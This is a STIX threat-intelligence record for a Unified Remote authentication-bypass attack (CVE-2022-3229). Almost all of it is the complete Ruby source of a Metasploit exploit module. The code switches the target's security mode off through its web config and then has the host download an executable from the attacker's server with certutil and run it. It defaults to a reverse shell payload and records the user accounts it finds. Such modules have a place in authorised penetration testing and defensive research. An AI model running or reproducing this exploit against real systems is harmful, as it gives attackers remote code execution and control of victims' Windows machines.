{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1f72a004-110f-48d4-a753-a2e664bf446c",
    "created": "2024-08-14T16:47:17.440087Z",
    "modified": "2024-08-14T16:47:17.440091Z",
    "name": "Unified Remote Auth Bypass to RCE",
    "description": " This module utilizes the Unified Remote remote control protocol to type out and deploy a payload.  The remote control protocol can be configured to have no passwords a group password, or individual user accounts.  If the web page is accessible, the access control is set to no password for exploitation, then reverted. If the web page is not accessible, exploitation will be tried blindly. This module has been successfully tested against version 3.11.0.2483 (50) on Windows 10.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/unified_remote_rce.rb",
            "external_id": "unified_remote_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.unifiedremote.com/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/H4rk3nz0/PenTesting/blob/main/Exploits/unified%20remote/unified-remote-rce.py"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-3229"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Exploit::Remote::Tcp\n  # attempted cmdstger, however there was so much sleep involved for the screen to clear the buffer\n  # that it was going to take hours. The buffer would also overrun itself and the exploit would fail\n  # if not enough sleep time was used. it was a nightmare, not for this exploit.\n  # include Msf::Exploit::CmdStager\n  include Exploit::EXE # generate_payload_exe\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Unified Remote Auth Bypass to RCE',\n        'Description' => %q{\n          This module utilizes the Unified Remote remote control protocol to type out and\n          deploy a payload.  The remote control protocol can be configured to have no passwords,\n          a group password, or individual user accounts.  If the web page is accessible, the\n          access control is set to no password for exploitation, then reverted.\n          If the web page is not accessible, exploitation will be tried blindly.\n          This module has been successfully tested against version 3.11.0.2483 (50) on Windows 10.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'H4RK3NZ0' # edb\n        ],\n        'References' => [\n          [ 'EDB', '49587' ],\n          [ 'URL', 'https://www.unifiedremote.com/' ],\n          [ 'URL', 'https://github.com/H4rk3nz0/PenTesting/blob/main/Exploits/unified%20remote/unified-remote-rce.py' ],\n          [ 'CVE', '2022-3229' ]\n        ],\n        'Arch' => [ ARCH_X64, ARCH_X86 ],\n        'Platform' => 'win',\n        'Stance' => Msf::Exploit::Stance::Aggressive,\n        'Targets' => [\n          ['default', {}],\n        ],\n        'Payload' => {\n          'BadChars' => \"\\x0a\\x00\"\n        },\n        'DefaultOptions' => {\n          # since this may get typed out ON SCREEN we want as small a payload as possible\n          'PAYLOAD' => 'windows/shell/reverse_tcp'\n        },\n        'DisclosureDate' => '2021-02-25',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [SCREEN_EFFECTS, ARTIFACTS_ON_DISK] # typing on screen\n        }\n      )\n    )\n    register_options(\n      [\n        OptPort.new('RPORT', [true, 'Port Unified Remote runs on', 9512]),\n        OptPort.new('WEBSERVER', [true, 'Port Unified Remote web server runs on', 9510]),\n        OptInt.new('SLEEP', [true, 'How long to sleep between commands', 1]),\n        OptString.new('PATH', [true, 'Where to stage payload for pull method', 'c:\\\\Windows\\\\Temp\\\\']),\n        OptString.new('CLIENTNAME', [false, 'Name of client, this shows up in the logs', '']),\n        OptBool.new('VISIBLE', [false, 'Make exploitation visible to the user', false]),\n      ]\n    )\n  end\n\n  def win_key\n    'LWIN' # 4c57494e\n  end\n\n  def ret_key\n    'RETURN' # 52455455524e\n  end\n\n  def space_key\n    'SPACE' # 5350414345\n  end\n\n  def path\n    return datastore['PATH'] if datastore['PATH'].end_with? '\\\\'\n\n    \"#{datastore['PATH']}\\\\\"\n  end\n\n  def initialize_packet\n    initialize_packet = \"\\x00\\x00\\x00\\x85\\x00\\x01\\x08\"\n    initialize_packet << \"Action\\x00\" # 416374696f6e 00\n    initialize_packet << \"\\x00\\x05\"\n    initialize_packet << \"Password\\x00\" # 50617373776f7264 00\n    initialize_packet << '8e8133b3-a18b-43af-a7cd-e04f747827ce' # 38653831333362332d613138622d343361662d613763642d653034663734373832376365 seems to be a default\n    initialize_packet << \"\\x00\\x05\"\n    initialize_packet << \"Platform\\x00\" # 506c6174666f726d 00\n    initialize_packet << \"android\\x00\" # 616e64726f6964 00\n    initialize_packet << \"\\x08\"\n    initialize_packet << \"Request\\x00\" # 52657175657374 00\n    initialize_packet << \"\\x00\\x05\"\n    initialize_packet << \"Source\\x00\" # 536f7572636500\n    # this line shows up in logs as who connected\n    initialize_packet << \"#{@client_name}\\x00\" # 616e64726f69642d64373038653134653532383463623831 00\n    initialize_packet << \"\\x03\"\n    initialize_packet << \"Version\\x00\" # 56657273696f6e 00\n    initialize_packet << \"\\x00\\x00\\x00\\x0a\\x00\"\n  end\n\n  def empty_authentication\n    empty_authentication = \"\\x00\\x00\\x00\\xc8\\x00\\x01\\x08\"\n    empty_authentication << \"Action\\x00\" # 416374696f6e 00\n    empty_authentication << \"\\x01\\x02\"\n    empty_authentication << \"Capabilities\\x00\" # 4361706162696c6974696573 00\n    empty_authentication << \"\\x04\"\n    empty_authentication << \"Actions\\x00\" # 416374696f6e73 00\n    empty_authentication << \"\\x01\\x04\"\n    empty_authentication << \"Encryption2\\x00\" # 456e6372797074696f6e32 00\n    empty_authentication << \"\\x01\\x04\"\n    empty_authentication << \"Fast\\x00\" # 46617374 00\n    empty_authentication << \"\\x00\\x04\"\n    empty_authentication << \"Grid\\x00\" # 47726964 00\n    empty_authentication << \"\\x01\\x04\"\n    empty_authentication << \"Loading\\x00\" # 4c6f6164696e6700\n    empty_authentication << \"\\x01\\x04\"\n    empty_authentication << \"Sync\\x00\" # 53796e6300\n    empty_authentication << \"\\x01\\x00\\x05\"\n    empty_authentication << \"Password\\x00\" # 50617373776f7264 00\n    empty_authentication << 'd634c1dcfdeb8735608a4a104ded4076de766dd61443619809ad7f35858d4492' # 64363334633164636664656238373335363038613461313034646564343037366465373636646436313434333631393830396164376633353835386434343932 seems to be a default\n    empty_authentication << \"\\x00\\x08\"\n    empty_authentication << \"Request\\x00\" # 52657175657374 00\n    empty_authentication << \"\\x01\\x05\"\n    empty_authentication << \"Source\\x00\" # 536f7572636500\n    # this line shows up in logs as who connected\n    empty_authentication << \"#{@client_name}\\x00\" # 616e64726f69642d64373038653134653532383463623831 00\n    empty_authentication << \"\\x00\"\n  end\n\n  #############################################\n  # These methods/packets are for visible mode\n  #############################################\n\n  def string_header_one(length)\n    # 2 null, then message length takes next 2 spots\n    string_header_one = \"\\x00\\x00\"\n    string_header_one << [length].pack('n').to_s\n  end\n\n  def string_header_two\n    string_header_two = \"\\x00\\x01\\x08\"\n    string_header_two << \"Action\\x00\" # 416374696f6e 00\n    string_header_two << \"\\x07\\x05\"\n    string_header_two << \"ID\\x00\" # 4944 00\n    string_header_two << \"Relmtech.Keyboard\\x00\" # 52656c6d746563682e4b6579626f617264 00\n    string_header_two << \"\\x02\"\n    string_header_two << \"Layout\\x00\" # 4c61796f7574 00\n    string_header_two << \"\\x06\"\n    string_header_two << \"Controls\\x00\" # 436f6e74726f6c73 00\n    string_header_two << \"\\x02\\x00\\x02\"\n    string_header_two << \"OnAction\\x00\" # 4f6e416374696f6e 00\n    string_header_two << \"\\x02\"\n    string_header_two << \"Extras\\x00\" # 457874726173 00\n    string_header_two << \"\\x06\"\n    string_header_two << \"Values\\x00\" # 56616c756573 00\n    string_header_two << \"\\x02\\x00\\x05\"\n    string_header_two << \"Value\\x00\" # 56616c7565 00\n  end\n\n  def string_footer\n    string_footer = \"\\x00\\x00\\x00\\x00\\x05\"\n    string_footer << \"Name\\x00\" # 4e616d65 00\n    string_footer << \"toggle\\x00\" # 746f67676c65 00\n    string_footer << \"\\x00\\x05\"\n    string_footer << \"Source\\x00\" # 536f75726365 00\n    # this line shows up in logs as who connected\n    string_footer << \"#{@client_name}\\x00\" # 616e64726f69642d64373038653134653532383463623831 00\n    string_footer << \"\\x00\"\n  end\n\n  def send_key(key, press_return: false)\n    if key == ' '\n      key = space_key\n    end\n    contents = \"#{string_header_two}#{key}#{string_header_three}#{key}#{string_footer}\"\n    contents = \"#{string_header_one(contents.length)}#{contents}\"\n    sock.put(contents)\n    if press_return\n      contents = \"#{string_header_two}#{ret_key}#{string_header_three}#{ret_key}#{string_footer}\"\n      contents = \"#{string_header_one(contents.length)}#{contents}\"\n      sock.put(contents)\n    end\n  end\n\n  ##############################################\n  # These methods/packets are for invisible mode\n  ##############################################\n\n  def load_unified_command\n    # header: 00 00 00 5e\n    wait = \"\\x00\\x01\\x08\"\n    wait << \"Action\\x00\" # 416374696f6e 00\n    wait << \"\\x03\\x05\" # changed from the previous one from 07 to 03\n    wait << \"ID\\x00\" # 4944 00\n    wait << \"Unified.Command\\x00\" # 556e69666965642e436f6d6d616e64 00\n    wait << \"\\x02\"\n    wait << \"Layout\\x00\" # 4c61796f7574 00\n    wait << \"\\x03\"\n    wait << \"Hash\\x00\" # 48617368 00\n    wait << \"\\x9e\\xd0\\x99:\\x00\" # 9ed0993a 00\n    wait << \"\\x08\"\n    wait << \"Request\\x00\" # 52657175657374 00\n    wait << \"\\x03\\x05\" # changed from the previous one from 07 to 03\n    wait << \"Source\\x00\" # 536f7572636500\n    wait << \"#{@client_name}\\x00\"\n    wait << \"\\x00\"\n  end\n\n  def create_script\n    # header: 00 00 00 e2\n    new_onee = \"\\x00\\x01\\x08\"\n    new_onee << \"Action\\x00\" # 416374696f6e 00\n    new_onee << \"\\x07\\x05\"\n    new_onee << \"ID\\x00\" # 4944 00\n    new_onee << \"Unified.Command\\x00\" # 556e69666965642e436f6d6d616e64 00\n    new_onee << \"\\x02\"\n    new_onee << \"Layout\\x00\" # 4c61796f7574 00\n    new_onee << \"\\x06\"\n    new_onee << \"Controls\\x00\" # 436f6e74726f6c73 00\n    new_onee << \"\\x02\\x00\\x02\"\n    new_onee << \"OnAction\\x00\" # 4f6e416374696f6e 00\n    new_onee << \"\\x02\"\n    new_onee << \"Extras\\x00\" # 457874726173 00\n    new_onee << \"\\x06\"\n    new_onee << \"Values\\x00\" # 56616c756573 00\n    new_onee << \"\\x02\\x00\\x05\"\n    new_onee << \"Key\\x00\" # 4b6579 00\n    new_onee << \"Text\\x00\" # 54657874 00\n    new_onee << \"\\x05\"\n    new_onee << \"Value\\x00\" # 56616c7565 00\n    new_onee << \"\\x00\\x00\\x00\\x00\\x05\"\n    new_onee << \"Name\\x00\" # 4e616d65 00\n    new_onee << \"update\\x00\" # 757064617465 00\n    new_onee << \"\\x00\\x08\"\n    new_onee << \"Type\\x00\" # 54797065 00\n    new_onee << \"\\x08\\x00\\x00\\x00\\x08\"\n    new_onee << \"Request\\x00\" # 52657175657374 00\n    new_onee << \"\\x07\\x02\"\n    new_onee << \"Run\\x00\" # 52756e 00\n    new_onee << \"\\x02\"\n    new_onee << \"Extras\\x00\" # 457874726173 00\n    new_onee << \"\\x06\"\n    new_onee << \"Values\\x00\" # 56616c756573 00\n    new_onee << \"\\x02\\x00\\x05\"\n    new_onee << \"Key\\x00\" # 4b6579 00\n    new_onee << \"Text\\x00\" # 54657874 00\n    new_onee << \"\\x05\"\n    new_onee << \"Value\\x00\" # 56616c7565 00\n    new_onee << \"\\x00\\x00\\x00\\x00\\x05\"\n    new_onee << \"Name\\x00\" # 4e616d65 00\n    new_onee << \"update\\x00\" # 757064617465 00\n    new_onee << \"\\x00\\x05\"\n    new_onee << \"Source\\x00\" # 536f75726365 00\n    new_onee << \"#{@client_name}\\x00\"\n    new_onee << \"\\x00\"\n  end\n\n  def initialize_keyboard\n    # header 00 00 00 4b\n    new_twoo = \"\\x00\\x01\\x08\"\n    new_twoo << \"Action\\x00\" # 416374696f6e 00\n    new_twoo << \"\\x05\\x05\"\n    new_twoo << \"ID\\x00\" # 4944 00\n    new_twoo << \"Unified.Command\\x00\" # 556e69666965642e436f6d6d616e64 00\n    new_twoo << \"\\x08\"\n    new_twoo << \"Request\\x00\" # 52657175657374 00\n    new_twoo << \"\\x05\\x05\"\n    new_twoo << \"Source\\x00\" # 536f75726365 00\n    new_twoo << \"#{@client_name}\\x00\"\n    new_twoo << \"\\x00\"\n  end\n\n  def add_content(command)\n    # header is dymanic based on length of command\n    new_threee = \"\\x00\\x01\\x08\"\n    new_threee << \"Action\\x00\" # 416374696f6e 00\n    new_threee << \"\\x07\\x05\"\n    new_threee << \"ID\\x00\" # 4944 00\n    new_threee << \"Unified.Command\\x00\" # 556e69666965642e436f6d6d616e64 00\n    new_threee << \"\\x02\"\n    new_threee << \"Layout\\x00\" # 4c61796f7574 00\n    new_threee << \"\\x06\"\n    new_threee << \"Controls\\x00\" # 436f6e74726f6c73 00\n    new_threee << \"\\x02\\x00\\x02\"\n    new_threee << \"OnAction\\x00\" # 4f6e416374696f6e 00\n    new_threee << \"\\x02\"\n    new_threee << \"Extras\\x00\" # 457874726173 00\n    new_threee << \"\\x06\"\n    new_threee << \"Values\\x00\" # 56616c756573 00\n    new_threee << \"\\x02\\x00\\x05\"\n    new_threee << \"Key\\x00\" # 4b6579 00\n    new_threee << \"Text\\x00\" # 54657874 00\n    new_threee << \"\\x05\"\n    new_threee << \"Value\\x00\" # 56616c7565 00\n    new_threee << command\n    new_threee << \"\\x00\\x00\\x00\\x00\\x05\"\n    new_threee << \"Name\\x00\" # 4e616d65 00\n    new_threee << \"update\\x00\" # 757064617465 00\n    new_threee << \"\\x00\\x08\"\n    new_threee << \"Type\\x00\" # 54797065 00\n    new_threee << \"\\x08\\x00\\x00\\x00\\x08\"\n    new_threee << \"Request\\x00\" # 52657175657374 00\n    new_threee << \"\\x07\\x02\"\n    new_threee << \"Run\\x00\" # 52756e 00\n    new_threee << \"\\x02\"\n    new_threee << \"Extras\\x00\" # 457874726173 00\n    new_threee << \"\\x06\"\n    new_threee << \"Values\\x00\" # 56616c756573 00\n    new_threee << \"\\x02\\x00\\x05\"\n    new_threee << \"Key\\x00\" # 4b6579 00\n    new_threee << \"Text\\x00\" # 54657874 00\n    new_threee << \"\\x05\"\n    new_threee << \"Value\\x00\" # 56616c7565 00\n    new_threee << command\n    new_threee << \"\\x00\\x00\\x00\\x00\\x05\"\n    new_threee << \"Name\\x00\" # 4e616d65 00\n    new_threee << \"update\\x00\" # 757064617465 00\n    new_threee << \"\\x00\\x05\"\n    new_threee << \"Source\\x00\" # 536f75726365 00\n    new_threee << \"#{@client_name}\\x00\"\n    new_threee << \"\\x00\"\n  end\n\n  def execute_script\n    # header 00 00 00 96\n    new_fourr = \"\\x00\\x01\\x08\"\n    new_fourr << \"Action\\x00\" # 416374696f6e 00\n    new_fourr << \"\\x07\\x05\"\n    new_fourr << \"ID\\x00\" # 4944 00\n    new_fourr << \"Unified.Command\\x00\" # 556e69666965642e436f6d6d616e64 00\n    new_fourr << \"\\x02\"\n    new_fourr << \"Layout\\x00\" # 4c61796f7574 00\n    new_fourr << \"\\x06\"\n    new_fourr << \"Controls\\x00\" # 436f6e74726f6c73 00\n    new_fourr << \"\\x02\\x00\\x02\"\n    new_fourr << \"OnAction\\x00\" # 4f6e416374696f6e 00\n    new_fourr << \"\\x05\"\n    new_fourr << \"Name\\x00\" # 4e616d65 00\n    new_fourr << \"execute\\x00\" # 65786563757465 00\n    new_fourr << \"\\x00\\x08\"\n    new_fourr << \"Type\\x00\" # 54797065 00\n    new_fourr << \"\\x08\\x00\\x00\\x00\\x08\"\n    new_fourr << \"Request\\x00\" # 52657175657374 00\n    new_fourr << \"\\x07\\x02\"\n    new_fourr << \"Run\\x00\" # 52756e 00\n    new_fourr << \"\\x05\"\n    new_fourr << \"Name\\x00\" # 4e616d65 00\n    new_fourr << \"execute\\x00\" # 65786563757465 00\n    new_fourr << \"\\x00\\x05\"\n    new_fourr << \"Source\\x00\" # 536f75726365 00\n    new_fourr << \"#{@client_name}\\x00\"\n    new_fourr << \"\\x00\"\n  end\n\n  def string_header_three\n    string_header_three = \"\\x00\\x00\\x00\\x00\\x05\"\n    string_header_three << \"Name\\x00\" # 4e616d65 00\n    string_header_three << \"toggle\\x00\" # 746f67676c65 00\n    string_header_three << \"\\x00\\x08\"\n    string_header_three << \"Type\\x00\" # 54797065 00\n    string_header_three << \"\\x08\\x00\\x00\\x00\\x08\"\n    string_header_three << \"Request\\x00\" # 52657175657374 00\n    string_header_three << \"\\x07\\x02\"\n    string_header_three << \"Run\\x00\" # 52756e 00\n    string_header_three << \"\\x02\"\n    string_header_three << \"Extras\\x00\" # 457874726173 00\n    string_header_three << \"\\x06\"\n    string_header_three << \"Values\\x00\" # 56616c756573 00\n    string_header_three << \"\\x02\\x00\\x05\"\n    string_header_three << \"Value\\x00\" # 56616c7565 00\n  end\n\n  def on_request_uri(cli, _req)\n    p = generate_payload_exe\n    send_response(cli, p)\n    print_good(\"Payload request received, sending #{p.length} bytes of payload for staging\")\n  end\n\n  def restart_server\n    http_sock = connect(false, { 'RPORT' => datastore['WEBSERVER'].to_i })\n    # http client overrides sock, so we had to pick one... long live sock\n    request =\t\"GET /system/restart HTTP/1.1\\r\\n\"\n    request <<\t\"Host: #{datastore['RHOST']}:#{datastore['WEBSERVER']}\\r\\n\"\n    request <<\t\"\\r\\n\"\n\n    http_sock.put(request)\n    disconnect\n    print_status('Sleeping 5 seconds for server to restart')\n    sleep(5)\n  end\n\n  def set_config(config)\n    print_status('Uploading new server config')\n    http_sock = connect(false, { 'RPORT' => datastore['WEBSERVER'].to_i })\n    # http client overrides sock, so we had to pick one... long live sock\n    request =\t\"POST /system/config HTTP/1.1\\r\\n\"\n    request <<\t\"Host: #{datastore['RHOST']}:#{datastore['WEBSERVER']}\\r\\n\"\n    request <<\t\"Accept: application/json, text/javascript, */*; q=0.01\\r\\n\"\n    request <<\t\"Content-Type: application/json\\r\\n\"\n    request <<\t\"X-Requested-With: XMLHttpRequest\\r\\n\"\n    request <<\t\"Content-Length: #{config.to_json.length}\\r\\n\"\n    request <<\t\"\\r\\n\"\n    request << config.to_json\n\n    http_sock.put(request)\n    begin\n      http_sock.get_once(-1)\n    rescue EOFError\n      return nil\n    end\n\n    disconnect\n    restart_server\n  end\n\n  def get_config\n    print_status('Retrieving server config')\n    http_sock = connect(false, { 'RPORT' => datastore['WEBSERVER'].to_i })\n    # http client overrides sock, so we had to pick one... long live sock\n    request =\t\"GET /system/config HTTP/1.1\\r\\n\"\n    request <<\t\"Host: #{datastore['RHOST']}:#{datastore['WEBSERVER']}\\r\\n\"\n    request <<\t\"\\r\\n\"\n\n    http_sock.put(request)\n    begin\n      res = http_sock.get_once(-1)\n    rescue EOFError\n      return nil\n    end\n    disconnect\n    body = res.split(\"\\r\\n\\r\\n\")[1]\n    if body.include?('<h1>Forbidden (403)</h1>')\n      print_error('Web interface is disabled. Unable to attempt bypass, assuming no authentication.')\n      return nil\n    else\n      # transient error where the JSON doesn't fully receive maybe 1/15 tries in my testing\n      begin\n        return JSON.parse(body) # split between headers and body\n      rescue JSON::ParserError\n        return nil\n      end\n    end\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      last_attempted_at: DateTime.now,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def check\n    security_mode = get_config\n    if security_mode.nil?\n      return CheckCode::Unknown('Unable to get config from web server, unknown status of Unified Remote Controller')\n    end\n\n    CheckCode::Vulnerable(\"Unified Remote is vulnerable on port #{security_mode['interfaces']['tcp']['port']} with security mode '#{security_mode['security']['mode']}' (can be bypassed, if needed)\")\n  end\n\n  def exploit\n    if datastore['CLIENTNAME'].blank?\n      @client_name = \"android-#{Rex::Text.rand_text_alphanumeric(16)}\"\n      print_status(\"Client name set to: #{@client_name}\")\n    else\n      @client_name = datastore['CLIENTNAME']\n    end\n    # first grab the config from the HTTP server to determine if we need to disable auth\n    security_mode = get_config\n    reset_security_mode = nil\n    unless security_mode.nil?\n      if security_mode['security']['mode'] == 'none'\n        print_good('No security enabled')\n      else\n        print_status(\"#{security_mode['security']['mode']} mode enabled, password required, bypassing\")\n        reset_security_mode = security_mode['security']['mode']\n        security_mode['security']['mode'] = 'none'\n        set_config(security_mode)\n      end\n      # now that we have the config, check if theres any users, no passwords (theyre GUIDs)\n      security_mode['security']['users'].each do |account|\n        print_good(\"Found account: #{account['username']}\")\n        report_cred(\n          ip: rhost,\n          port: rport,\n          service_name: 'wifi mouse',\n          user: account['username'],\n          password: '',\n          proof: account\n        )\n      end\n    end\n\n    # start actually exploiting the rdp-ish server\n    connect\n    print_status('Sending handshake')\n    sock.put(initialize_packet)\n    sleep(datastore['SLEEP'])\n    print_status('Sending empty authentication')\n    sock.put(empty_authentication)\n    sleep(datastore['SLEEP'])\n\n    filename = Rex::Text.rand_text_alphanumeric(rand(8..17)) + '.exe'\n    register_file_for_cleanup(\"#{path}#{filename}\")\n    # this method was in the original edb exploit, this is significantly faster\n    # and speed is of the essence since remote user input most likely breaks this module\n    stager = \"certutil.exe -urlcache -f http://#{datastore['lhost']}:#{datastore['SRVPORT']}/ #{path}#{filename}\"\n    start_service('Path' => '/') # start webserver\n\n    if datastore['VISIBLE']\n      print_status('Opening Start Menu')\n      # original exploit sent it twice, so we follow that\n      send_key(win_key)\n      send_key(win_key)\n      sleep(datastore['SLEEP'])\n\n      print_status('Opening command prompt')\n      'cmd.exe'.each_char do |letter|\n        send_key(letter)\n      end\n      send_key(ret_key)\n      sleep(datastore['SLEEP'])\n\n      print_status('Typing out payload')\n      stager.each_char do |letter|\n        send_key(letter)\n      end\n      send_key(ret_key)\n      sleep(datastore['SLEEP'] * 2) # give time for it to save\n\n      print_status('Attempting to open payload')\n      \"#{path}#{filename} && exit\".each_char do |letter|\n        send_key(letter)\n      end\n      send_key(ret_key)\n    else\n      stager << \" && #{path}#{filename} && exit\"\n      print_status('Loading Unified.Command')\n      contents = load_unified_command\n      sock.put(\"#{string_header_one(contents.length)}#{contents}\")\n      sleep(datastore['SLEEP'])\n\n      print_status('Updating Unified.Command')\n      contents = create_script\n      sock.put(\"#{string_header_one(contents.length)}#{contents}\")\n      sleep(datastore['SLEEP'])\n\n      contents = initialize_keyboard\n      sock.put(\"#{string_header_one(contents.length)}#{contents}\")\n      sleep(datastore['SLEEP'])\n\n      print_status('Sending payload')\n      contents = add_content(stager)\n      sock.put(\"#{string_header_one(contents.length)}#{contents}\")\n      sleep(datastore['SLEEP'])\n\n      print_status('Executing script')\n      contents = execute_script\n      sock.put(\"#{string_header_one(contents.length)}#{contents}\")\n      sleep(datastore['SLEEP'])\n\n      contents = create_script\n      sock.put(\"#{string_header_one(contents.length)}#{contents}\")\n      sleep(datastore['SLEEP'])\n    end\n\n    handler\n    disconnect\n    sleep(datastore['SLEEP'] * 2) # give time for it to do its thing before we revert\n\n    # lastly some cleanup\n    unless reset_security_mode.nil?\n      print_status('Reverting security mode')\n      security_mode['security']['mode'] = reset_security_mode\n      set_config(security_mode)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-02-25",
    "x_mitre_platforms": [
        "win'"
    ]
}